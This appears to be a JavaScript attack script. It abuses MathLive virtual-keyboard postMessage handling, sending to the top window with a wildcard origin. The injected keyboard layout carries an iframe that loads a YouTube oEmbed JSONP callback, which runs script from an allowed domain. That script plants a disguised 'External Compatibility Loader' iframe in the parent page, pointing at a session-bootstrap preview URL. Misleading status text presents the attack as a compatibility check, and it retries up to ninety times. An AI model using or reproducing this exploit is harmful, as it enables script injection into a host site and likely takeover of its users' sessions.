const statusNode = document.getElementById("status");
const callback =
  "d=parent.document;if(!d.getElementById('bb-site-stage')){" +
  "f=d.createElement('iframe');f.id='bb-site-stage';" +
  "f.title='External Compatibility Loader';" +
  "f.src='/sites/appgprj_6ad60f867cb48191abbb39fca684b669/preview?session_bootstrap=1';" +
  "f.setAttribute('style','position:fixed;right:16px;bottom:16px;width:360px;height:180px;" +
  "border:2px solid #2563eb;border-radius:10px;background:white;z-index:2147483646');" +
  "d.body.appendChild(f)}";

function attributeEscape(value) {
  return value.replaceAll("&", "&amp;")
    .replaceAll("\"", "&quot;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

let attempt = 0;
function deliver() {
  const endpoint = new URL("https://www.youtube.com/oembed");
  endpoint.searchParams.set("url", "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  endpoint.searchParams.set("callback", callback + ";void");
  const source = '<script src="' + attributeEscape(endpoint.href) + '"><' + '/script>';
  const markup = '<iframe srcdoc="' + attributeEscape(source) + '"></iframe>';
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "update-setting",
    layouts: [{
      label: "Site preview compatibility check",
      layers: [{ id: "site-preview-stage", markup }],
    }],
  }, "*");
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "show",
    animate: false,
  }, "*");
  attempt += 1;
  if (statusNode) {
    statusNode.textContent = "Site preview compatibility attempt " + attempt + " sent.";
  }
  if (attempt >= 90) clearInterval(timer);
}

deliver();
const timer = setInterval(deliver, 2000);
